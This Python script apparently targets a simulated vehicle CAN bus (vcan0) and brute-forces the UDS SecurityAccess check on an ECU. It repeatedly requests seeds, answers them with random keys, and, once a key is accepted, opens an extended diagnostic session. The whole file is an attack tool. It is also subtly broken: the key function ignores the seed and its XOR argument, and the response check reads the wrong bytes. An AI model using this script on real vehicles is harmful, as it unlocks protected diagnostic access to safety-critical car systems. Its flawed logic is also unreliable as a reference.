import can
import random
import struct
import time
import binascii
#import uds
#from uds import Uds

ECU_ID = 0x7E0
TOOL_ID = 0x7E8
seed = [0,0,0,0]
key = [0,0,0,0]

def request_seed(bus):
    msg = can.Message(arbitration_id=ECU_ID, data=[0x02, 0x27, 0x05], is_extended_id=False)
    bus.send(msg)

    while True:
        response = bus.recv(1)
        if response is not None and response.arbitration_id == TOOL_ID:
            print(response)
            if response.data[1] == 0x67:
                seed[0] = response.data[3] 
                seed[1] = response.data[4] 
                seed[2] = response.data[5] 
                seed[3] = response.data[6] 
                for value in seed:
                    print(hex(value))
                return seed

def generate_key(seed, xor_value):
    for i in range(4):
        key[i] = random.randint(0,255) 
        print(hex(key[i]))
    return key 

def send_key(bus, key):
    msg = can.Message(arbitration_id=ECU_ID, data=[0x06, 0x27, 0x06] + list(key), is_extended_id=False)
    bus.send(msg)

    while True:
        response = bus.recv(1)
        if response is not None and response.arbitration_id == TOOL_ID:
            if response.data[2] == 0x67 and response.data[3] == 0x02:
                return True
        return False

def main():
    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
    msg = can.Message(arbitration_id=ECU_ID, data=[0x02, 0x11, 0x01], is_extended_id=False)
    bus.send(msg)
    time.sleep(3)


#    rawEcu = Uds(reqId=0x7e0, resId=0x7e8, interface='socketcan')
#    ensRaw = rawEcu.send([0x27,0x01])
#    print(ensRaw)


    while True: 
        seed = request_seed(bus)
        print(f"Seed: {seed}")

        key = generate_key(seed, 0x20)
        print(f"Generated Key: {key}")
    #    print(f"XORing using: {hex(i)}")

        if send_key(bus, key):
            print("Key is valid")
            msg = can.Message(arbitration_id=ECU_ID, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
            bus.send(msg)
            
            time.sleep(0.5)
            msg = can.Message(arbitration_id=ECU_ID, data=[0x02, 0x10, 0x03], is_extended_id=False)
            bus.send(msg)
    #        time.sleep(0.5)

            quit()


        else:
            print("Key is invalid")

if __name__ == "__main__":
    main()


